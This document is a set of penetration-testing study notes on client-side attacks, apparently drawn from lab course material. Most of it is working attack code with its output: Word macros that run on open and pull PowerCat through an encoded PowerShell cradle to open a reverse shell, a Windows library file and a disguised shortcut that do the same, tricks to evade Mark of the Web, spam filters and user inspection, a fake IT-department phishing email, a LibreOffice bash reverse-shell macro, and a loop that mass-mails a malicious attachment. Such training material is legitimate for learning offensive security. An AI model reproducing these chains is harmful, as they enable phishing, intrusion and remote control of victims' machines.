## Client-Side Attacks

When choosing an attack vector and payload, we must first perform reconnaissance to determine the operating system of the target as well as any installed applications. 

This is a critical first step, as our payload must match the capability of the target. 

	For example, if the target is running the Windows operating system, we can use a variety of client-side attacks like malicious JScript code executed through the Windows Script Host or .lnk shortcut files pointing to malicious resources. If the target has installed Microsoft Office, we could leverage documents with embedded malicious macros.

One approach is to inspect the **metadata tags** of publicly-available documents associated with the target organization. Bear in mind that our findings may be outdated if we are inspecting older documents. In addition, different branches of the organization may use slightly different software.

If we want to interact with the target's web site, we could also use tools like gobuster3 with the -x parameter to search for specific file extensions on the target's web site. This is noisy and will generate log entries on the target. 


### Exif Tool

To display the metadata of any supported file.
- Website: https://exiftool.org/ 

Provide the arguments -a to display duplicated tags and -u to display unknown tags along with the filename brochure.pdf:
```bash
exiftool -a -u brochure.pdf

kali@kali:~/Downloads$ exiftool -a -u brochure.pdf 
ExifTool Version Number         : 12.41
File Name                       : brochure.pdf
Directory                       : .
File Size                       : 303 KiB
File Modification Date/Time     : 2022:04:27 03:27:39-04:00
File Access Date/Time           : 2022:04:28 07:56:58-04:00
File Inode Change Date/Time     : 2022:04:28 07:56:58-04:00
File Permissions                : -rw-------
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 4
Language                        : en-US
Tagged PDF                      : Yes
XMP Toolkit                     : Image::ExifTool 12.41
Creator                         : Stanley Yelnats
Title                           : Mountain Vegetables
Author                          : Stanley Yelnats
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Create Date                     : 2022:04:27 07:34:01+02:00
Creator Tool                    : Microsoft® PowerPoint® for Microsoft 365
Modify Date                     : 2022:04:27 07:34:01+02:00
Document ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
Instance ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
Title                           : Mountain Vegetables
Author                          : Stanley Yelnats
Create Date                     : 2022:04:27 07:34:01+02:00
Modify Date                     : 2022:04:27 07:34:01+02:00
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Creator                         : Stanley Yelnats
```

The Author section reveals the name of an internal employee. We could use our knowledge of this person to better establish a trust relationship by dropping their name casually into a targeted email or phone conversation. This is especially helpful if the author maintains a relatively small public profile.

The output further reveals that the PDF was created with Microsoft PowerPoint for Microsoft 365. This is crucial information for us to plan our client-side attack since we now know that the target uses Microsoft Office and since there is no mention of "macOS" or "for Mac" in any of the metadata tags, it's very probable that Windows was used to create this document.

### Client Fingerprinting

Obtaining operating system and browser information from a target in a non-routable internal network. 

#### The Harvester

Used to extract an email address of a promising target.

#### Canarytokens

A free web service that generates a link with an embedded token that we'll send to the target. When the target opens the link in a browser, we will get information about their browser, IP address, and operating system. When the target clicks the link, the IP logger creates a fingerprint of the target providing us the necessary information to prepare our client-side attack.

Resource: http://canarytokens.com

We could use an HTML Application (HTA) attached to an email to execute code in the context of Internet Explorer and to some extent, Microsoft Edge. This is a very popular attack vector to get an initial foothold in a target's network. However, the user agent can be modified and is not always a reliable source of information.

There are alternative fingerprinting tools such as **Grabify** & **fingerprint.js**

## Exploiting Microsoft Office

### Preparing the Attack

First, we must consider the delivery method of our document. Since malicious macro attacks are well-known, email providers and spam filter solutions often filter out all Microsoft Office documents by default. Therefore, in a majority of situations we can't just send the malicious document as an attachment. 

To deliver our payload and increase the chances that the target opens the document, we could use a pretext and provide the document in another way, like a download link.

If we successfully manage to deliver the Office document to our target via email or download link, the file will be tagged with the **Mark of the Web (MOTW)**. Office documents tagged with MOTW will open in Protected View, which disables all editing and modification settings in the document and blocks the execution of macros or embedded objects. When the victim opens the MOTW-tagged document, Office will show a warning with the option to Enable Editing. When the victim enables editing, the protected view is disabled. **MOTW is not added to files on FAT32-formatted devices. And it is possible to avoid getting a file flagged with MOTW by providing it in container file formats like 7zip, ISO, or IMG**

Therefore, the most basic way to overcome this limitation is to convince the target to click the Enable Editing button by, for example, blurring the rest of the document and instructing them to click the button to "unlock" it.

We could also rely on other macro-enabled Microsoft Office programs that lack Protected View, like Microsoft Publisher, but this is less frequently installed.

**Microsoft is in the process of disabling Macros by default, and making it much more tedious on the user to enable them (under file properties)**

### Connecting to Microsoft 

**On Windows 11, Network Level Authentication (NLA)1 is enabled by default for RDP connections. Because OFFICE is not a domain-joined machine, rdesktop won't connect to it. We can use xfreerdp instead, which supports NLA for non domain-joined machines.**

```bash
xfreerdp /u:[username] /p:[password] /v:[ip_address]
```

Resource: `https://linuxcommandlibrary.com/man/xfreerdp`

### Leveraging Microsoft Word Macros

*Macros can be written from scratch in Visual Basic for Applications (VBA), which is a powerful scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.*

*Bear in mind that older client-side attack vectors, including Dynamic Data Exchange (DDE) and various Object Linking and Embedding (OLE) methods do not work well today without significant target system modification.*

Create a blank Word document with mymacro as the file name and save it in the .doc format. This is important because the newer .docx file type cannot save macros without attaching a containing template. This means that we can run macros within .docx files but we can't embed or save the macro in the document. In other words, the macro is not persistent. Alternatively, we could also use the .docm file type for our embedded macro.

*A sub procedure is very similar to a function in VBA. The difference lies in the fact that sub procedures cannot be used in expressions because they do not return any values, whereas functions do.*

In this example, we'll leverage ActiveX Objects, which provide access to underlying operating system commands. This can be achieved with WScript through the Windows Script Host Shell object.

Once we instantiate a Windows Script Host Shell object with CreateObject, we can invoke the Run11 method for Wscript.Shell in order to launch an application on the target client machine. For our first macro, we'll start a PowerShell window. The code for that macro is shown below.

```bash
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

Since Office macros are not executed automatically, we must use the predefined AutoOpen macro and Document_Open event. These procedures can call our custom procedure and run our code when a Word document is opened. They differ slightly, depending on how Microsoft Word and the document were opened. Both cover special cases which the other one doesn't and therefore we use both.

Our updated VBA code is shown below:

```bash
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

Let's extend the code execution of our current macro to a reverse shell with the help of PowerCat. We'll use a base64-encoded PowerShell download cradle to download PowerCat and start the reverse shell. The encoded PowerShell command will be declared as a String in VBA.

VBA has a 255-character limit for literal strings and therefore, we can't just embed the base64-encoded PowerShell commands as a single string. **This restriction does not apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them.** Declare a string variable named Str with the Dim14 keyword, which we'll use to store our PowerShell download cradle and the command to create a reverse shell with PowerCat. The following listing shows the declaration of the variable and the modified line to run the command stored as a string in the variable.

```bash
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

*To base64-encode our command, we can use pwsh on Kali as we did in the Common Web Application Attacks Module.*

Before encoding:

```bash
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

*Use ../encode_and_slice_macros.py.
*
```bash
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```

Let's start a Python3 web server in the directory where the PowerCat script is located. We'll also start a Netcat listener on port 4444.

After saving, closing, and reopening the document, the macro is automatically executed. Note that the macro security warning regarding the Enable Content button is not appearing again. It will only appear again if the name of the document changes.

After the macro is executed, we receive a GET request for the PowerCat script in our Python3 web server and an incoming reverse shell in our Netcat listener.

```bash 
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.196] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\offsec\Documents>
```

Opening the document ran the macro and sent us a reverse shell. Excellent!

#### Summary of Leveraging Microsoft Word Macros

First, we created a VBA macro in a Word document to execute a single command when the document is opened. Then, we replaced the single command with a base64-encoded PowerShell command downloading PowerCat and starting a reverse shell on the local system.

### Obtaining Code Execution via Windows Library Files

Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a .Library-ms file extension and can be executed by double-clicking them in Windows Explorer.

Create a Windows library file connecting to a WebDAV share we'll set up. In the first stage, the victim receives a .Library-ms file, perhaps via email. When they double-click the file, it will appear as a regular directory in Windows Explorer. In the WebDAV directory, we'll provide a payload in the form of a .lnk shortcut file for the second stage to execute a PowerShell reverse shell. We must convince the user to double-click our .lnk payload file to execute it.

The disadvantage of using a web server like Apache is that we would need to provide our web link to the victim (again, perhaps by email).  Most spam filters and security technologies analyze the contents of a link for suspicious content or executable file types to download.

```bash
kali@kali:~$ mkdir /home/kali/webdav

kali@kali:~$ touch /home/kali/webdav/test.txt

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
Running without configuration file.
17:41:53.917 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
17:41:53.919 - INFO    : WsgiDAV/4.0.1 Python/3.9.10 Linux-5.15.0-kali3-amd64-x86_64-with-glibc2.33
17:41:53.919 - INFO    : Lock manager:      LockManager(LockStorageDict)
17:41:53.919 - INFO    : Property manager:  None
17:41:53.919 - INFO    : Domain controller: SimpleDomainController()
17:41:53.919 - INFO    : Registered DAV providers by route:
17:41:53.919 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.9/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
17:41:53.919 - INFO    :   - '/': FilesystemProvider for path '/home/kali/webdav' (Read-Write) (anonymous)
17:41:53.920 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
17:41:53.920 - WARNING : Share '/' will allow anonymous write access.
17:41:53.920 - WARNING : Share '/:dir_browser' will allow anonymous read access.
17:41:54.348 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.5.2+ds1 Python 3.9.10
17:41:54.348 - INFO    : Serving on http://0.0.0.0:80 ..
```

Next, let's create the Windows library file. We'll use xfreerdp to connect to the CLIENT137 machine at 192.168.50.194 via RDP to prepare our attack. We can connect to the system with offsec as the username and lab as the password. This will make it a lot easier for us to build and test our library file, and later, our shortcut file.


#### Creating XML File

In the menu bar, we'll click on File > New Text File. We'll then save the empty file as config.Library-ms on the offsec user's desktop. As soon as we save the file with this file extension, it is displayed with an icon. While the icon doesn't look dangerous, it is not commonly used by Windows and therefore may raise suspicions. To increase the chances that our victim will execute our file, let's change its appearance.

Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are General library information, Library properties, and Library locations.

The listing below contains the namespace for the library file. This is the namespace for the version of the library file format starting from Windows 7. The listing also contains the closing tag for the library description. All of the following tags we cover will be added inside the libraryDescription tags.

```bash
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
```

    Listing 12 - XML and Library Description Version

Next, we'll add two tags providing information about the library. The name tag specifies the name of this library. We must not confuse this with an arbitrary name we can just set randomly. We need to specify the name of the library by providing a DLL name and index. We can use @shell32.dll,-34575 or @windows.storage.dll,-34582 as specified on the Microsoft website. We'll use the latter to avoid any issues with text-based filters that may flag on "shell32". The version tag can be set to a numerical value of our choice, for example, 6.

```bash
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```

    Listing 13 - Name and Version Tags of the Library

Next, we'll add the isLibraryPinned tag. This element specifies if the library is pinned to the navigation pane in Windows Explorer. For our targets, this may be another small detail to make the whole process feel more genuine and therefore, we'll set it to true. The next tag we'll add is iconReference, which determines what icon is used to display the library file. We must specify the value in the same format as the name element. We can use imagesres.dll to choose between all Windows icons. We can use index "-1002" for the Documents folder icon from the user home directories or "-1003" for the Pictures folder icon. We'll provide the latter to make it look more benign.

```bash
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```

    Listing 14 - Configuration for Navigation Bar Pinning and Icon

Now, let's add the templateInfo tags, which contain the folderType tags. These tags determine the columns and details that appear in Windows Explorer by default after opening the library. We'll need to specify a GUID that we can look up on the Microsoft documentation webpage. For this example, we'll use the Documents GUID to appear as convincing as possible for the victim.

```bash
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```

    Listing 15 - templateInfo and folderType tags

The next tag marks the beginning of the library locations section. In this section, we specify the storage location where our library file should point to. We'll begin by creating the searchConnectorDescriptionList, tag which contains a list of search connectors defined by searchConnectorDescription. Search connectors are used by library files to specify the connection settings to a remote location. We can specify one or more searchConnectorDescription elements inside the searchConnectorDescriptionList tags. For this example we only specify one.

Inside the description of the search connector, we'll specify information and parameters for our WebDAV share. The first tag we'll add is the isDefaultSaveLocation tag with the value set to true. This tag determines the behavior of Windows Explorer when a user chooses to save an item. To use the default behavior and location, we'll set it to true. Next, we'll add the isSupported tag, which is not documented in the Microsoft Documentation webpage, and is used for compatibility. We can set it to false.

The most important tag is url, which we need to point to our previously-created WebDAV share over HTTP. It is contained within the simpleLocation tags, which we can use to specify the remote location in a more user-friendly way as the normal locationProvider element.

```bash
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```

    Listing 16 - templateInfo and folderType tags

Let's paste the code into Visual Studio Code.

We have just reviewed the XML code for all of the sections of our library File. We now have a basic understanding of the inner workings of library files and can customize them to fit our needs. The following listing shows the entire XML:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.231</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
    Listing 17 - Windows Library code for connecting to our WebDAV Share

Let's save and close the file in Visual Studio Code. We'll then double-click the config.Library-ms file on the Desktop.

The path in the navigation bar only shows config without any indication that this is actually a remote location. This makes it a perfect first stage for our client-side attack.

The library file will modify when the user clicks it.

#### Creating Shortcut

Let's create the shortcut on the desktop for the offsec user. For this, we'll right-click on the desktop and click on New then on Shortcut. In the Create Shortcut window, we can enter a path to a program along with arguments, which will be pointed to by the shortcut. We'll point the shortcut to PowerShell and use another download cradle to load PowerCat from our Kali machine and start a reverse shell.

```bash
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.231:8000/powercat.ps1');powercat -c 192.168.45.231 -p 445 -e powershell"
```

*If we expect that our victims are tech-savvy enough to actually check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.*

In the next window, let's enter automatic_configuration as the name for the shortcut file and click Finish to create the file.

On our Kali machine, let's start a Python3 web server on port 8000 where powercat.ps1 is located and start a Netcat listener on port 4444.

*Instead of using a Python3 web server to serve Powercat, we could also host it on the WebDAV share. However, as our WebDAV share is writable, AV and other security solutions could remove or quarantine our payload. If we configure the WebDAV share as read-only, we'd lose a great method of transferring files from target systems. Throughout this course, we'll use a Python3 web server to serve our payload for attacks utilizing Windows Library files.*

To confirm that the download cradle and the PowerCat reverse shell works, let's double-click the shortcut file on the desktop. After confirming that we want to run the application in the appearing window, the Netcat listener should receive a reverse shell.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0>
```

To conclude this section, let's obtain a reverse shell from the HR137 machine at 192.168.50.195. For this example, we'll provide the Windows library file we created to a simulated victim with a pretext. Our goal is to convince the victim to double-click the shortcut after embedding the WebDAV share via the prepared Windows library file.

The pretext is an important aspect of this client-side attack. In this case we could tell the target that we are a new member of the IT team and we need to configure all client systems for the new management platform. We'll also tell them that we've included a user-friendly configuration program. An example email for use in a real assessment is shown below.

```bash
Hello! My name is Dwight, and I'm a new member of the IT Team. 

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!
```

    Listing 20 - Example email content

Now, let's copy automatic_configuration.lnk and config.Library-ms to our WebDAV directory on our Kali machine. For convenience, we can use the config library file to copy the files into the directory. In a normal assessment we would most likely send the library file via email but for this example, we'll use the \\192.168.50.195\share SMB share to simulate the delivery step.

Next, we'll start the Python3 web server on port 8000 to serve powercat.ps1, WsgiDAV for our WebDAV share /home/kali/webdav, and a Netcat listener on port 4444.

To upload the library file to the SMB share, we'll use smbclient with the -c parameter to specify the put config.Library-ms command. Before we execute smbclient, we need to change our current directory to the library file's directory. We'll also delete the previously-created test.txt file from the WebDAV share.
```bash
kali@kali:~$ cd webdav

kali@kali:~/webdav$ cd webdav

kali@kali:~/webdav$ rm test.txt

kali@kali:~/webdav$ smbclient //192.168.50.195/share -c 'put config.Library-ms'
Enter WORKGROUP\kali's password: 
putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8 kb/s)
```

    Listing 21 - Uploading our Library file to the SMB share on the HR137 machine

After we put the library file on the target's machine via smbclient, a simulated user on the system opens it and starts the reverse shell by executing the shortcut file.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
hr137\hsmith
```
    Listing 22 - Incoming reverse shell from HR137

Listing 22 shows that we successfully received a reverse shell with our Library and shortcut files.

We could also have combined this technique with our previous Office macro attack, or any other type of client-side attacks.

#### Get Process Information from Loopback

```bash
Get-Process -Id 1234
```

#### Linux Phishing


LibreOffice Macros

Last modified: 2023-09-09

LibreOffice is an open-source office software alternative to Microsoft Word, Excel, etc. There are multiple applications such as Calc, Writer. Supported file extensions are also variety such as .odf, .odp, odt (OpenDocument), .odb (OpenOffice Base) etc.
Create Macro to Code Execution

Reference: https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html


1. Create Macro

We can create a macro and embed it into a LibreOffice file, like Microsoft Excel.

    a. Open one of the LibreOffice applications such as Calc, Writer.

    b. Save a new empty file at first.

    c. Go to Tools → Macros → Organize Macros → Basic. The BASIC Macros window opens.

    d. In the window, select our new created filename in the left pane, then click New. Enter arbitrary module name and click OK. Macro editor (LibreOffice Basic) opens.

    e. In the Macro editor, write our code as below. It’s an example for reverse shell. A great alternative for macro code for windows is macro-generator.py.

```bash
REM  *****  BASIC  *****

Sub Main
    Shell("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
End Sub
```

    f. Now close the editor.

2. Embed the Macro to LibreOffice File.

    a. After creating a macro as above, next configure the macro to run immediately after opening this LibreOffice file.

    b. Return to the original window on LibreOffice.

    c. Go to Tools → Macros → Organize Macros → Basic again. The BASIC Macros window opens.

    d. Select our new created macro (module) in the left pane. For example,
```
    example.odt
        - Standard
            - Module1 <- select this
```

    e. Click Assign. The Customize window opens.

    f. In Customize window, go to Events tab. Then select Open Document and click 'Macro…'. The Macro Selector window opens.

    g. In the Macro Selector window, select our new created macro (module), then click OK.

    h. Now we should see the text such "Standard.Module1.Main" at the right of the Open Document. Click OK.

    i. Save this LibreOffice file again.

    z. Finally, we’ve created the file which is executed when the file opens.
```

```bash
for name in $(cat valid.txt); for name2 in $(cat valid.txt); do echo "sudo swaks --to $name@postfish.off --from $name2@postfish.off --server postfish.off --attach @evil.odt --body 'smokum' --header 'Subject: king'" >> all-swaks.txt; done

for line in $(cat all-swaks.txt); do echo $line|bash; done
```